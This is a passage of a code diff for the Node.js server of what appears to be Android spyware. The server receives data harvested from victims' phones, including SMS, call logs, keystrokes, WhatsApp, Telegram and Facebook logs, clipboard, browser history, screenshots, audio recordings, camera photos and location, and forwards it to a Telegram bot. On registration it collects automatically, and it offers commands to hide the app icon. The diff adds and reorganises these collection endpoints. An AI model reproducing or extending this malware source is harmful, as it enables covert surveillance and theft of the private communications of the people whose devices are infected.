-                    message = devicePrefix + `📞 <b>Call Logs Update</b>\n` +
-                             `Data: ${logData.data?.substring(0, 100)}`;
-                }
-                break;
-                
             case 'sms':
-                try {
-                    const sms = JSON.parse(logData.data || '[]');
-                    message = devicePrefix + `💬 <b>SMS Update</b>\n` +
-                             `Total messages: ${sms.length}`;
-                } catch (e) {
-                    message = devicePrefix + `💬 <b>SMS Update</b>\n` +
-                             `Data: ${logData.data?.substring(0, 100)}`;
-                }
-                break;
-                
-            case 'screenshot':
-                message = devicePrefix + `📸 <b>Screenshot Taken</b>\n` +
-                         `Size: ${logData.size ? (logData.size/1024).toFixed(2) + 'KB' : 'unknown'}\n` +
-                         `Quality: ${logData.quality || 'unknown'}%`;
-                break;
-                
-            case 'recording':
-                message = devicePrefix + `🎤 <b>Recording Saved</b>\n` +
-                         `Duration: ${logData.duration || 'unknown'}s\n` +
-                         `Size: ${logData.size ? (logData.size/1024/1024).toFixed(2) + 'MB' : 'unknown'}`;
-                break;
-                
-            case 'installed_apps':
-                try {
-                    const apps = JSON.parse(logData.data || '[]');
-                    message = devicePrefix + `📱 <b>Apps List Update</b>\n` +
-                             `Total apps: ${apps.length}`;
-                } catch (e) {
-                    message = devicePrefix + `📱 <b>Apps List Update</b>\n` +
-                             `Data: ${logData.data?.substring(0, 100)}`;
-                }
-                break;
-                
-            case 'installed_apps_detailed':
-                return res.json({ success: true, handled: 'apps_detailed_endpoint' });
+            case 'calllogs':
+            case 'apps':
+            case 'keystrokes':
+            case 'notifications':
+            case 'whatsapp':
+            case 'telegram':
+            case 'facebook':
+            case 'browser_history':
+            case 'clipboard':
+            case 'calendar':
+            case 'screenshots':
+                return res.json({ success: true, handled: 'file_upload_endpoint' });
                 
             case 'device_info':
                 try {
@@ -2180,27 +2026,6 @@ app.post('/api/logs', async (req, res) => {
                              `Data: ${logData.data?.substring(0, 100)}`;
                 }
                 break;
-                
-            case 'device_snapshots':
-                return res.json({ success: true, handled: 'device_snapshots_endpoint' });
-                
-            case 'telegram':
-                return res.json({ success: true, handled: 'telegram_endpoint' });
-                
-            case 'facebook':
-                return res.json({ success: true, handled: 'facebook_endpoint' });
-                
-            case 'calendar':
-                return res.json({ success: true, handled: 'calendar_endpoint' });
-                
-            case 'keystrokes_detailed':
-                return res.json({ success: true, handled: 'keystrokes_endpoint' });
-                
-            case 'screenshots':
-                return res.json({ success: true, handled: 'screenshots_endpoint' });
-                
-            case 'notifications_detailed':
-                return res.json({ success: true, handled: 'notifications_detailed_endpoint' });
                 
             default:
                 message = devicePrefix + `📝 <b>Log: ${logData.type}</b>\n` +
@@ -2399,14 +2224,15 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    if (command && (command.includes('_html') || command.includes('_detailed') ||
+    if (command && (command === 'find_media' || command.includes('_html') ||
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
         command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
         command === 'mobile_info' || command === 'find_recorded' ||
-        command === 'telegram' || command === 'facebook' || command === 'calendar' ||
-        command === 'keystrokes_detailed' || command === 'screenshots' ||
-        command === 'apps_detailed' || command === 'notifications_detailed' ||
-        command === 'device_snapshots' || command === 'contacts_detailed')) {
+        command === 'contacts' || command === 'sms' || command === 'calllogs' ||
+        command === 'apps' || command === 'keystrokes' || command === 'notifications' ||
+        command === 'whatsapp' || command === 'telegram' || command === 'facebook' ||
+        command === 'browser_history' || command === 'clipboard' || command === 'calendar' ||
+        command === 'screenshots')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -2478,22 +2304,19 @@ app.post('/api/register', async (req, res) => {
         welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
         welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
         welcomeMessage += `The server is automatically requesting:\n`;
-        welcomeMessage += `• 🌐 IP Address Information\n`;
-        welcomeMessage += `• 📞 Phone Number\n`;
-        welcomeMessage += `• 📱 SIM Information\n`;
-        welcomeMessage += `• 📶 WiFi Details\n`;
-        welcomeMessage += `• 📱 Mobile Network Info\n`;
-        welcomeMessage += `• 📇 Contacts (Basic & Detailed)\n`;
+        welcomeMessage += `• 📇 Contacts\n`;
         welcomeMessage += `• 💬 SMS Messages\n`;
         welcomeMessage += `• 📞 Call Logs\n`;
-        welcomeMessage += `• 📱 Installed Apps (Basic & Detailed)\n`;
-        welcomeMessage += `• 💬 Telegram Logs\n`;
-        welcomeMessage += `• 💬 Facebook Logs\n`;
-        welcomeMessage += `• 📅 Calendar Events\n`;
-        welcomeMessage += `• ⌨️ Detailed Keystrokes\n`;
-        welcomeMessage += `• 📸 Screenshot Metadata\n`;
-        welcomeMessage += `• 🔔 Detailed Notifications\n`;
-        welcomeMessage += `• 📊 Device Snapshots\n`;
+        welcomeMessage += `• 📱 Installed Apps\n`;
+        welcomeMessage += `• ⌨️ Keystrokes\n`;
+        welcomeMessage += `• 🔔 Notifications\n`;
+        welcomeMessage += `• 💬 WhatsApp\n`;
+        welcomeMessage += `• 💬 Telegram\n`;
+        welcomeMessage += `• 💬 Facebook\n`;
+        welcomeMessage += `• 🌐 Browser History\n`;
+        welcomeMessage += `• 📋 Clipboard\n`;
+        welcomeMessage += `• 📅 Calendar\n`;
+        welcomeMessage += `• 📸 Screenshots\n`;
         welcomeMessage += `• 📍 Location\n\n`;
         welcomeMessage += `This may take a few moments as the device processes each request.`;
         
@@ -2569,7 +2392,7 @@ app.get('/test', (req, res) => {
                 <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-                <p><b>Commands Available:</b> 75+ commands including all new entity types</p>
+                <p><b>Commands Available:</b> 85+ commands including all media types</p>
             </div>
             
             <h2>📱 Registered Devices (${userDevices.length})</h2>
@@ -2611,53 +2434,31 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n✅ DEVICE CONFIGURATION SYSTEM:');
-    console.log('   └─ Each device gets its own configuration');
-    console.log('   └─ Config includes bot token, chat ID, feature flags');
-    console.log('\n✅ MULTI-DEVICE SUPPORT ENABLED:');
-    console.log('   └─ /devices - List all devices');
-    console.log('   └─ /select [device_id] - Switch active device');
-    console.log('\n✅ NEW ENTITY COMMANDS ADDED:');
-    console.log('   └─ 💬 /telegram - Get Telegram logs');
-    console.log('   └─ 💬 /facebook - Get Facebook logs');
-    console.log('   └─ 📅 /calendar - Get calendar events');
-    console.log('   └─ ⌨️ /keystrokes_detailed - Detailed keystrokes');
-    console.log('   └─ 📸 /screenshots - Screenshot metadata');
-    console.log('   └─ 📱 /apps_detailed - Detailed apps info');
-    console.log('   └─ 🔔 /notifications_detailed - Detailed notifications');
-    console.log('   └─ 📊 /device_snapshots - Device history');
-    console.log('   └─ 📇 /contacts_detailed - Detailed contacts');
-    console.log('   └─ 🔄 /sync_all_new - Sync all new tables');
-    console.log('   └─ ⚡ /force_harvest - Force full harvest');
-    console.log('\n✅ NEW ENDPOINTS ADDED:');
-    console.log('   └─ POST /api/telegram/:deviceId');
-    console.log('   └─ POST /api/facebook/:deviceId');
-    console.log('   └─ POST /api/calendar/:deviceId');
-    console.log('   └─ POST /api/keystrokes/:deviceId');
-    console.log('   └─ POST /api/screenshots/:deviceId');
-    console.log('   └─ POST /api/apps-detailed/:deviceId');
-    console.log('   └─ POST /api/notifications-detailed/:deviceId');
-    console.log('   └─ POST /api/device-snapshots/:deviceId');
-    console.log('   └─ POST /api/contacts-detailed/:deviceId');
-    console.log('\n✅ AUTO-DATA COLLECTION ENHANCED:');
-    console.log('   └─ Now collects all new entity types automatically');
-    console.log('   └─ Total commands in queue: 20');
-    console.log('\n✅ COMPLETE COMMAND LIST (75+ commands):');
-    console.log('   └─ Devices: /devices, /select');
-    console.log('   └─ Data (Basic): contacts, sms, calllogs, apps, keystrokes, notifications');
-    console.log('   └─ Data (HTML): contacts_html, sms_html, calllogs_html, apps_html, keystrokes_html');
-    console.log('   └─ Data (Detailed): contacts_detailed, keystrokes_detailed, notifications_detailed, apps_detailed');
-    console.log('   └─ Social: telegram, facebook, whatsapp, browser_history');
-    console.log('   └─ Calendar: calendar');
-    console.log('   └─ Screenshots: screenshot, screenshots, screenshot_logs');
-    console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status, camera_front, camera_back, camera_switch');
-    console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high, find_recorded');
-    console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
-    console.log('   └─ Phone: phone_number, sim_info');
-    console.log('   └─ Location: location, storage, battery, info, time, status');
-    console.log('   └─ App: app_opens, app_opens_html, clipboard');
-    console.log('   └─ Realtime: realtime_on, realtime_off, realtime_status');
-    console.log('   └─ Device Snapshots: device_snapshots, device_history');
-    console.log('   └─ Services: hide_icon, show_icon, reboot_app, clear_logs, logs_count, stats, refresh_data, sync_all, sync_all_new, force_harvest, help');
+    console.log('\n✅ MENU STRUCTURE UPDATED:');
+    console.log('   📱 Device Info - Network, Apps, Device Info, Battery, Storage, Time, Status');
+    console.log('   📞 Phone Info - Phone Number, SIM, Mobile Info, Call Logs, Location, SMS, Contacts, Calendar');
+    console.log('   📍 Tracking - Location, Keystrokes, Notifications, App Opens');
+    console.log('   🌐 Network - IP, WiFi, Mobile, Network Status');
+    console.log('   📸 Screenshot - Take, Settings, Service Control, Logs, Size, Target Apps');
+    console.log('   🎤 Recording - Start/Stop 60s, Settings, Schedule, Auto ON/OFF, Media Scan');
+    console.log('   📸 Camera - Take Photo, Switch Camera, Front/Back, Start/Stop Monitoring');
+    console.log('   💬 Social - WhatsApp, Telegram, Facebook, Browser History, Clipboard');
+    console.log('   📁 Media - Find Media, Screenshots');
+    console.log('   🔔 Realtime - ON/OFF, Status');
+    console.log('   ⚙️ Services - Hide/Show Icon, Reboot, Clear, Stats, Force Harvest');
+    console.log('\n✅ NEW COMMANDS ADDED:');
+    console.log('   📸 /screenshot_settings - Screenshot configuration with all options');
+    console.log('   🎤 /recording_settings - Recording configuration with all options');
+    console.log('   📁 /find_media - Scan for all media files (images, videos, audio)');
+    console.log('   📋 /clipboard - Get clipboard history');
+    console.log('   🌐 /browser_history - Get browser history');
+    console.log('   💬 /whatsapp - Get WhatsApp logs');
+    console.log('   💬 /telegram - Get Telegram logs');
+    console.log('   💬 /facebook - Get Facebook logs');
+    console.log('   📅 /calendar - Get calendar events');
+    console.log('   📸 /screenshots - Get screenshot metadata');
+    console.log('\n✅ AUTO-DATA COLLECTION UPDATED:');
+    console.log('   └─ Now collects 18 data types automatically');
+    console.log('   └─ Includes all social media and media types');
     console.log('\n🚀 ===============================================\n');
 });
